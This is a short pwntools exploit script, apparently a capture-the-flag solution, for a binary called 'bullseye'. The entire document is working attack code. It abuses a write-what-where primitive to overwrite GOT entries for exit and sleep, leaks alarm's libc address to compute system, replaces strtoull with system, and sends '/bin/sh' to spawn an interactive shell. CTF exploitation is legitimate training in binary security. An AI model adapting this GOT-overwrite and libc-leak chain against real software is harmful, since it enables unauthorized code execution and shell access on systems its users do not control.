from pwn import * 
import time

p = process("./bullseye")
elf =ELF("libc6_2.27-3ubuntu1.2_amd64.so")
binary= ELF("bullseye")

def what_where(where,what):
  
  p.recvuntil("Where do you want to write to?")
  p.sendline(hex(where))
  p.recvuntil("What do you want to write?")
  p.sendline(hex(what))
  
ret = 0x40101a #: ret;



main = 0x401260 #<main>:
exit_got = 0x404058                 #0x00000000004010b0 <+0>:     jmp    QWORD PTR [rip+0x2fa2]        # 0x404058

sleep = binary.got['sleep'] #sleep got 


what_where(exit_got,main) #begining loop to another main
what_where(sleep,ret) #bypass sleep 

p.recvline("\n")
recieved = p.recvuntil("\n")
leak = int(recieved,16)
log.info("Alarm Libc Leak: " +hex(leak))  #leak addr


base_libc = leak - elf.symbols['alarm']
system_libc = elf.symbols['system'] + base_libc

strtoull_got = 0x404040


what_where(strtoull_got,system_libc) #overwrite strtoull with system 
p.sendline("/bin/sh\x00")
p.interactive()

